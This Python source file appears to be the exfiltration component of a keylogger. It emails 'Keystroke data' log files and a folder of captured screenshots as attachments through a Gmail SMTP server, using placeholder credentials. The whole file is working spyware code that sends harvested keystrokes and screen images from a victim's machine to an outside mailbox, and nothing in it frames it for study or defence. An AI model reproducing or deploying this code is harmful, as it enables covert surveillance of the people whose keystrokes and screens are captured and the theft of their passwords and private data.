import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import datetime
import os

EMAIL_USER = "youremail@gmail.com"
EMAIL_PASSWORD = "password123"
EMAIL_SEND = "youreamil@gmail.com"
SUBJECT = "Keystroke data"
HOST = "smtp.gmail.com"
PORT = 587

def generate_sending_info(body):
    msg = MIMEMultipart()
    msg["From"] = EMAIL_USER
    msg["To"] = EMAIL_SEND
    msg["Subject"] = SUBJECT
    body = body + " " + str(datetime.datetime.now())
    msg.attach(MIMEText(body, 'plain'))
    return msg

def call_mail_server(text):
    server = smtplib.SMTP(HOST, PORT)
    server.starttls()
    server.login(EMAIL_USER, EMAIL_PASSWORD)
    server.sendmail(EMAIL_USER, EMAIL_SEND, text)
    server.quit()

def send_log_file(file_name):
    msg = generate_sending_info("New Logs")    
    attachment = open(file_name, 'rb')

    part = MIMEBase('application','octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= " + file_name)

    msg.attach(part)
    text = msg.as_string()
    call_mail_server(text)

def send_images(images_path):
    msg = generate_sending_info("New screenshots")
    files = os.listdir(images_path)

    for file in files:
        attachment = open(images_path +  file, 'rb')
        part = MIMEBase('application','octet-stream')
        part.set_payload((attachment).read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', "attachment; filename= " + file)
        msg.attach(part)
        text = msg.as_string()

    call_mail_server(text)

    